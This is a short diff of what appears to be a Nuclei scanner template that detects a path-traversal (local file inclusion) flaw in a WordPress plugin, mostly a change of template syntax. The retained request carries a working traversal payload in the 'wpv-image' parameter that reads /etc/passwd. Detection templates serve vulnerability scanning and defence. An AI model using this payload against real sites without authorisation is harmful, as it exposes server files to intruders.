@@ -12,10 +12,8 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: lfi,edb,wp-plugin,wordpress
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
